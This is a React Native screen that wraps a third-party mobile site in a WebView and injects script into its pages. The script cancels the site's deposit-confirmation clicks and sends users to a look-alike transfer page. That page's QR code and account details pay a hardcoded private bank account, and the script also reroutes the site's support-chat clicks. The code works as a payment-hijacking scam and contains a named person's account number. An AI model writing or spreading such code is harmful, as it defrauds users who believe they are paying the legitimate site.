import { useCallback, useState } from "react";
import {
  Alert,
  ActivityIndicator,
  Clipboard,
  Image,
  Linking,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  ToastAndroid,
  View,
  Platform,
} from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import { WebView } from "react-native-webview";

// ─── Cấu hình ───────────────────────────────────────────────────────────────

const WEBVIEW_URL = "https://m.332165.com/";
const SUPPORT_URL = "https://example.com/support";

const BANK_INFO = {
  bankId: "TCB",                         // mã VietQR
  bankName: "Techcombank",
  accountNumber: "6545666668",
  accountHolder: "PHAM THE BAO",
  transferNote: "UNG HO NHA PHAT TRIEN",
  template: "compact2",
};

// ─── Types ───────────────────────────────────────────────────────────────────

type DepositInfo = {
  amountDisplay: string;
  amountValue: string;
  rawAmount: string;
};

// ─── Danh sách ngân hàng hiển thị ───────────────────────────────────────────

const BANK_OPTIONS = [
  { key: "nab", label: "NAM A BANK", image: require("../qrcode/images/nab.png") },
  { key: "bidv", label: "BIDV", image: require("../qrcode/images/bidv.png") },
  { key: "msb", label: "MSB", image: require("../qrcode/images/msb.png") },
  { key: "stb", label: "SACOMBANK", image: require("../qrcode/images/stb.png") },
  { key: "vietbank", label: "VIETBANK", image: require("../qrcode/images/vietbank.png") },
  { key: "vietcombank", label: "VIETCOMBANK", image: require("../qrcode/images/vcb.png") },
];

// ─── Injected JS chạy trong DOM của WebView ──────────────────────────────────

const INJECTED_JS = `
(function() {
  if (window.__rnInjected) return;
  window.__rnInjected = true;

  function emit(action, data) {
    if (!window.ReactNativeWebView) return;
    window.ReactNativeWebView.postMessage(
      JSON.stringify(Object.assign({ action: action }, data || {}))
    );
  }

  function log(msg) {
    if (window.ReactNativeWebView) {
      window.ReactNativeWebView.postMessage("DEBUG_LOG:" + msg);
    }
  }

  /* Chuẩn hóa text: bỏ dấu, uppercase, trim */
  function normalizeText(text) {
    return (text || "")
      .toUpperCase()
      .normalize("NFD")
      .replace(/[\u0300-\u036f]/g, "")
      .replace(/\s+/g, " ")
      .trim();
  }

  /* Phân tích số tiền từ text, hỗ trợ hậu tố K / M */
  function parseAmount(raw) {
    var text = String(raw || "").toUpperCase().replace(/\s+/g, "");
    if (!text) return "0";

    var multiplier = 1;
    if (/K$/.test(text)) multiplier = 1000;
    else if (/M$/.test(text)) multiplier = 1000000;

    text = text.replace(/[^0-9.,]/g, "");
    if (!text) return "0";

    // Chuẩn hóa dấu phân cách: 1.000.000 -> 1000000 ; 1,000 -> 1000
    if (text.indexOf(",") > -1 && text.indexOf(".") > -1) {
      // có cả dấu phẩy và dấu chấm -> bỏ dấu phân nghìn
      text = text.replace(/,/g, "").replace(/\\./g, "");
    } else if (text.indexOf(",") > -1) {
      // chỉ có dấu phẩy -> phân nghìn kiểu VN: 1,000 -> 1000
      var parts = text.split(",");
      if (parts[parts.length - 1].length === 3) {
        text = text.replace(/,/g, "");
      } else {
        // dấu phẩy là dấu thập phân
        text = text.replace(",", ".");
      }
    } else if (text.indexOf(".") > -1) {
      var dparts = text.split(".");
      if (dparts[dparts.length - 1].length === 3) {
        text = text.replace(/\\./g, "");
      }
    }

    var value = parseFloat(text);
    if (!value || value <= 0) return "0";
    return String(Math.round(value * multiplier));
  }

  /* Lấy số tiền RAW từ DOM — trả về đúng số người dùng nhập, chưa nhân hệ số
     Ví dụ: người dùng gõ "100" -> trả về "100"
     App React sẽ nhân x1000 để ra 100,000 VND */
  function getAmountFromDom() {
    // Ưu tiên 1: các ô input visible có value
    var inputSelectors = [
      'input[placeholder*="ti\u1ebfn"]',
      'input[placeholder*="Ti\u1ebfn"]',
      'input[placeholder*="money"]',
      'input[placeholder*="amount"]',
      'input[type="number"]',
      '.ui-input__input',
      '.amount input',
      '[class*="amount"] input',
      '[class*="money"] input',
      'input[type="text"]'
    ];

    for (var i = 0; i < inputSelectors.length; i++) {
      var inputs = document.querySelectorAll(inputSelectors[i]);
      for (var k = 0; k < inputs.length; k++) {
        var inp = inputs[k];
        // Chỉ lấy input đang visible
        if (inp.value && inp.offsetParent !== null) {
          var p = parseAmount(inp.value);
          if (p !== "0") {
            log("getAmount from input[" + inputSelectors[i] + "] = " + p);
            return p;
          }
        }
      }
    }

    // Ưu tiên 2: gói đang active/selected có text là số tiền
    var activeSelectors = [
      '[class*="active"]',
      '[class*="selected"]',
      '[class*="checked"]',
      '.active',
      '.selected'
    ];

    for (var j = 0; j < activeSelectors.length; j++) {
      var nodes = document.querySelectorAll(activeSelectors[j]);
      for (var m = 0; m < nodes.length; m++) {
        var node = nodes[m];
        var txt = (node.textContent || node.innerText || "").trim();
        if (txt) {
          var pn = parseAmount(txt);
          // Giá trị hợp lệ: >= 1 (sau khi app nhân x1000 sẽ >= 1000)
          if (pn !== "0" && Number(pn) >= 1) {
            log("getAmount from active node = " + pn);
            return pn;
          }
        }
      }
    }

    return "0";
  }

  /* Kiểm tra có phải nút xác nhận nạp tiền không
     — chỉ khớp EXACT text sau normalize, không dùng indexOf để tránh bắt nhầm */
  function isConfirmButton(el) {
    if (!el) return false;

    // Chỉ xét button / a / element có role button — bỏ qua div/span/label
    var tag = (el.tagName || "").toUpperCase();
    var role = (el.getAttribute ? el.getAttribute("role") : null) || "";
    var isClickable = tag === "BUTTON" || tag === "A" || role === "button";
    if (!isClickable) return false;

    var text = normalizeText(el.textContent || el.innerText || "");
    // Exact match: text của nút phải đúng là "XAC NHAN NAP TIEN"
    if (text === "XAC NHAN NAP TIEN") return true;

    // Class cụ thể — chỉ khớp tên class chính xác, không regex chung
    if (el.classList) {
      if (el.classList.contains("confimeButton") || el.classList.contains("confirmButton")) return true;
    }

    return false;
  }

  /* Xử lý click nút xác nhận nạp tiền */
  function handleGlobalClick(event) {
    var target = event.target;

    // Kiểm tra line-chat trước
    var lineEl = target && target.closest ? target.closest(".line-chat") : null;
    if (lineEl) {
      event.preventDefault();
      event.stopPropagation();
      if (event.stopImmediatePropagation) event.stopImmediatePropagation();
      emit("line_chat_clicked", {});
      return false;
    }

    // Kiểm tra nút xác nhận nạp tiền
    var buttonEl = target && target.closest
      ? target.closest('button, [role="button"], a, div, span')
      : target;

    if (!isConfirmButton(buttonEl)) return true;

    // Chống double-fire
    if (window.__rnConfirmLock) {
      event.preventDefault();
      event.stopPropagation();
      if (event.stopImmediatePropagation) event.stopImmediatePropagation();
      return false;
    }

    window.__rnConfirmLock = true;
    setTimeout(function() { window.__rnConfirmLock = false; }, 1500);

    event.preventDefault();
    event.stopPropagation();
    if (event.stopImmediatePropagation) event.stopImmediatePropagation();

    var amount = getAmountFromDom();
    log("confirm_deposit clicked, amount=" + amount);
    emit("confirm_deposit_clicked", { amount: amount });
    return false;
  }

  // Attach một lần lên document — bắt tất cả bubble
  document.addEventListener("click",      handleGlobalClick, { capture: true, passive: false });
  document.addEventListener("touchend",   handleGlobalClick, { capture: true, passive: false });

})();
true;
`;

// ─── Component chính ─────────────────────────────────────────────────────────

export default function WebViewScreen() {
  const [depositInfo, setDepositInfo] = useState<DepositInfo | null>(null);
  const [qrLoading, setQrLoading] = useState(true);

  // ── Helpers ──────────────────────────────────────────────────────────────

  const formatMoneyInt = (money = 0) =>
    String(money).replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1,");

  const buildTransferContent = (rawAmount: string) =>
    `${BANK_INFO.transferNote} ${rawAmount}`
      .replace(/[^a-zA-Z0-9\s]/g, " ")
      .replace(/\s+/g, " ")
      .trim()
      .slice(0, 50);

  const buildVietQrUrl = (info: DepositInfo) => {
    const note = buildTransferContent(info.rawAmount);
    return (
      `https://img.vietqr.io/image/${BANK_INFO.bankId}-${BANK_INFO.accountNumber}` +
      `-${BANK_INFO.template}.png` +
      `?amount=${info.amountValue}` +
      `&addInfo=${encodeURIComponent(note)}` +
      `&accountName=${encodeURIComponent(BANK_INFO.accountHolder)}`
    );
  };

  const isActiveBankOption = (bankKey: string, bankLabel: string) => {
    const id = BANK_INFO.bankId.toLowerCase();
    const name = BANK_INFO.bankName.toLowerCase();
    return id.includes(bankKey) || name.includes(bankKey) || name.includes(bankLabel.toLowerCase());
  };

  const copyToClipboard = (value: string, label: string) => {
    Clipboard.setString(value);
    if (Platform.OS === "android") {
      ToastAndroid.show(`Đã sao chép ${label}`, ToastAndroid.SHORT);
    } else {
      Alert.alert("Đã sao chép", label);
    }
  };

  // ── Xử lý message từ WebView ──────────────────────────────────────────────

  const handleWebViewMessage = useCallback(async (event: any) => {
    const message: string = event.nativeEvent.data;

    if (message.startsWith("DEBUG_LOG:")) {
      console.log("[WebView]", message.replace("DEBUG_LOG:", ""));
      return;
    }

    try {
      const data = JSON.parse(message);

      if (data.action === "confirm_deposit_clicked") {
        const rawInput = Number(data.amount);   // số người dùng gõ vào input, VD: 100
        if (!rawInput || rawInput <= 0) {
          Alert.alert("Thông báo", "Số tiền nạp không hợp lệ. Vui lòng kiểm tra lại.");
          return;
        }
        // Tỉ lệ 1:1000 — người dùng nhập 100 -> chuyển khoản 100,000 VND
        const finalAmount = rawInput * 1000;
        setQrLoading(true);
        setDepositInfo({
          amountDisplay: `${formatMoneyInt(finalAmount)} VND`,
          amountValue: String(finalAmount),
          rawAmount: String(rawInput),          // lưu lại số gốc để hiển thị nội dung CK
        });
      }

      if (data.action === "line_chat_clicked") {
        const canOpen = await Linking.canOpenURL(SUPPORT_URL);
        if (canOpen) await Linking.openURL(SUPPORT_URL);
      }
    } catch {
      console.log("[WebView] Non-JSON:", message);
    }
  }, []);

  // ── Render: màn hình thanh toán ───────────────────────────────────────────

  if (depositInfo) {
    const transferNote = buildTransferContent(depositInfo.rawAmount);
    return (
      <SafeAreaView style={styles.container}>
        <ScrollView style={styles.paymentScreen} contentContainerStyle={styles.paymentContent}>

          {/* Header */}
          <View style={styles.paymentHeader}>
            <Text style={styles.paymentHeaderText}>Thanh toán bằng Chuyển khoản</Text>
          </View>

          <View style={styles.paymentCard}>
            {/* Hàng logo ngân hàng */}
            <View style={styles.bankLogosRow}>
              {BANK_OPTIONS.slice(0, 4).map((bank) => {
                const active = isActiveBankOption(bank.key, bank.label);
                return (
                  <View key={bank.key} style={[styles.bankLogoItem, active && styles.bankLogoItemActive]}>
                    <Image source={bank.image} style={styles.bankLogoImage} />
                    <Text style={[styles.bankLogoText, active && styles.bankLogoTextActive]}>
                      {bank.label}
                    </Text>
                  </View>
                );
              })}
              <View style={styles.bankMoreItem}>
                <Text style={styles.bankMoreText}>{"›"}</Text>
              </View>
            </View>

            {/* Cách 1: QR */}
            <View style={styles.methodCard}>
              <Text style={styles.methodTitle}>Cách 1: Chuyển khoản bằng mã QR</Text>
              <Text style={styles.methodDescription}>Mở ứng dụng ngân hàng và quét QRCode</Text>

              <Image
                source={require("../qrcode/assets/qr.png")}
                style={styles.brandLogo}
                resizeMode="contain"
              />

              <View style={styles.qrFrame}>
                {qrLoading && (
                  <ActivityIndicator
                    size="large"
                    color="#0b72e7"
                    style={StyleSheet.absoluteFillObject}
                  />
                )}
                <Image
                  source={{ uri: buildVietQrUrl(depositInfo) }}
                  style={styles.qrImage}
                  resizeMode="contain"
                  onLoadEnd={() => setQrLoading(false)}
                  onError={() => setQrLoading(false)}
                />
              </View>

              <Text style={styles.napasInfo}>napas 247 | {BANK_INFO.bankName.toUpperCase()}</Text>

              <Text style={styles.supportAppsText}>40 App ngân hàng hỗ trợ quét mã</Text>
            </View>

            {/* Cách 2: Thủ công */}
            <View style={styles.methodCard}>
              <Text style={styles.methodTitle}>
                Cách 2: Chuyển khoản{" "}
                <Text style={styles.methodTitleHighlight}>thủ công</Text> theo thông tin
              </Text>

              <InfoRow label="Ngân hàng" value={BANK_INFO.bankName} />
              <InfoRow
                label="Số TK"
                value={BANK_INFO.accountNumber}
                onCopy={() => copyToClipboard(BANK_INFO.accountNumber, "số tài khoản")}
              />
              <InfoRow label="Chủ TK" value={BANK_INFO.accountHolder} />
              <InfoRow
                label="Số tiền"
                value={depositInfo.amountDisplay}
                valueStyle={styles.amountText}
                onCopy={() => copyToClipboard(depositInfo.amountValue, "số tiền")}
              />
              <InfoRow
                label="Nội dung"
                value={transferNote}
                isLast
                onCopy={() => copyToClipboard(transferNote, "nội dung chuyển khoản")}
              />
            </View>

            {/* Lưu ý */}
            <View style={styles.noticeCard}>
              <Text style={styles.noticeTitle}>⚠ Lưu ý</Text>
              <Text style={styles.noticeText}>
                Không thay đổi số tiền và nội dung chuyển khoản nếu bạn muốn đối soát tự động.
              </Text>
            </View>
          </View>

          {/* Nút hành động */}
          <Pressable
            style={({ pressed }) => [styles.primaryButton, pressed && styles.buttonPressed]}
            onPress={() => setDepositInfo(null)}
          >
            <Text style={styles.primaryButtonText}>✓ Tôi đã chuyển khoản</Text>
          </Pressable>

          <Pressable
            style={({ pressed }) => [styles.secondaryButton, pressed && styles.buttonPressed]}
            onPress={() => setDepositInfo(null)}
          >
            <Text style={styles.secondaryButtonText}>← Quay lại trang nạp tiền</Text>
          </Pressable>

        </ScrollView>
      </SafeAreaView>
    );
  }

  // ── Render: WebView ───────────────────────────────────────────────────────

  return (
    <SafeAreaView style={styles.container}>
      <WebView
        source={{ uri: WEBVIEW_URL }}
        javaScriptEnabled
        domStorageEnabled
        injectedJavaScript={INJECTED_JS}
        startInLoadingState
        scalesPageToFit
        style={styles.webview}
        onMessage={handleWebViewMessage}
      />
    </SafeAreaView>
  );
}

// ─── InfoRow helper component ────────────────────────────────────────────────

function InfoRow({
  label,
  value,
  valueStyle,
  isLast,
  onCopy,
}: {
  label: string;
  value: string;
  valueStyle?: object;
  isLast?: boolean;
  onCopy?: () => void;
}) {
  return (
    <View style={[styles.infoRow, isLast && styles.infoRowLast]}>
      <Text style={styles.infoRowLabel}>{label}</Text>
      <Text style={[styles.infoRowValue, valueStyle]}>{value}</Text>
      {onCopy && (
        <Pressable onPress={onCopy} style={styles.copyButton}>
          <Text style={styles.copyButtonText}>Sao chép</Text>
        </Pressable>
      )}
    </View>
  );
}

// ─── Styles ───────────────────────────────────────────────────────────────────

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: "#fff" },
  webview: { flex: 1 },
  paymentScreen: { flex: 1, backgroundColor: "#eef3f8" },
  paymentContent: { padding: 16, gap: 14 },

  paymentHeader: {
    backgroundColor: "#e8f1ff",
    borderRadius: 16,
    paddingVertical: 14,
    paddingHorizontal: 18,
    borderWidth: 1,
    borderColor: "#d0e0ed",
  },
  paymentHeaderText: { fontSize: 16, fontWeight: "700", color: "#0b72e7", textAlign: "center" },

  paymentCard: {
    backgroundColor: "#fff",
    borderRadius: 18,
    padding: 18,
    borderWidth: 1,
    borderColor: "#d9e3ef",
  },

  bankLogosRow: {
    flexDirection: "row",
    alignItems: "flex-start",
    justifyContent: "space-between",
    backgroundColor: "#fbfdff",
    borderWidth: 1,
    borderColor: "#e3e8ef",
    borderRadius: 14,
    paddingVertical: 12,
    paddingHorizontal: 8,
    marginBottom: 18,
  },
  bankLogoItem: { alignItems: "center", flex: 1, paddingHorizontal: 2 },
  bankLogoItemActive: { transform: [{ translateY: -2 }] },
  bankLogoImage: {
    width: 38,
    height: 38,
    borderRadius: 19,
    borderWidth: 1,
    borderColor: "#e5e7eb",
    marginBottom: 5,
    backgroundColor: "#fff",
  },
  bankLogoText: { fontSize: 9, color: "#64748b", textAlign: "center" },
  bankLogoTextActive: { color: "#0f172a", fontWeight: "700" },
  bankMoreItem: { width: 24, alignItems: "center", justifyContent: "center", paddingTop: 6 },
  bankMoreText: { fontSize: 22, color: "#94a3b8", fontWeight: "700" },

  methodCard: {
    backgroundColor: "#f8fafc",
    borderWidth: 1,
    borderColor: "#e2e8f0",
    borderRadius: 16,
    padding: 16,
    marginBottom: 14,
  },
  methodTitle: { fontSize: 16, fontWeight: "700", color: "#0f172a", marginBottom: 6, lineHeight: 22 },
  methodTitleHighlight: { color: "#0b72e7", textDecorationLine: "underline" },
  methodDescription: { fontSize: 13, color: "#64748b", marginBottom: 12 },

  brandLogo: { width: 110, height: 44, alignSelf: "center", marginBottom: 10 },
  qrFrame: {
    alignSelf: "center",
    backgroundColor: "#fff",
    borderRadius: 14,
    padding: 10,
    borderWidth: 1,
    borderColor: "#e2e8f0",
    marginBottom: 12,
    width: 240,
    height: 240,
    justifyContent: "center",
    alignItems: "center",
  },
  qrImage: { width: 220, height: 220 },
  napasInfo: {
    textAlign: "center",
    fontSize: 12,
    color: "#475569",
    fontWeight: "700",
    marginBottom: 6,
    textTransform: "uppercase",
  },
  supportAppsText: { textAlign: "center", color: "#0b72e7", fontSize: 12, textDecorationLine: "underline" },

  infoRow: {
    flexDirection: "row",
    alignItems: "center",
    paddingVertical: 10,
    borderBottomWidth: 1,
    borderBottomColor: "#dbe4f0",
    gap: 8,
  },
  infoRowLast: { flexDirection: "row", alignItems: "center", paddingTop: 10, gap: 8 },
  infoRowLabel: { width: 76, fontSize: 13, color: "#64748b" },
  infoRowValue: { flex: 1, fontSize: 14, color: "#0f172a", fontWeight: "700" },
  amountText: { color: "#dc2626", fontSize: 16 },

  copyButton: { backgroundColor: "#e8f1ff", borderRadius: 8, paddingVertical: 4, paddingHorizontal: 8 },
  copyButtonText: { fontSize: 11, color: "#0b72e7", fontWeight: "700" },

  noticeCard: {
    backgroundColor: "#eff6ff",
    borderRadius: 16,
    padding: 14,
    borderWidth: 1,
    borderColor: "#bfdbfe",
  },
  noticeTitle: { fontSize: 14, fontWeight: "700", color: "#1d4ed8", marginBottom: 4 },
  noticeText: { fontSize: 13, lineHeight: 19, color: "#1e3a8a" },

  primaryButton: {
    backgroundColor: "#dc2626",
    borderRadius: 18,
    paddingVertical: 14,
    alignItems: "center",
  },
  primaryButtonText: { color: "#fff", fontSize: 16, fontWeight: "700" },

  secondaryButton: {
    borderRadius: 18,
    paddingVertical: 14,
    alignItems: "center",
    backgroundColor: "#fff",
    borderWidth: 1,
    borderColor: "#cbd5e1",
  },
  secondaryButtonText: { color: "#0f172a", fontSize: 15, fontWeight: "600" },

  buttonPressed: { opacity: 0.75 },
});
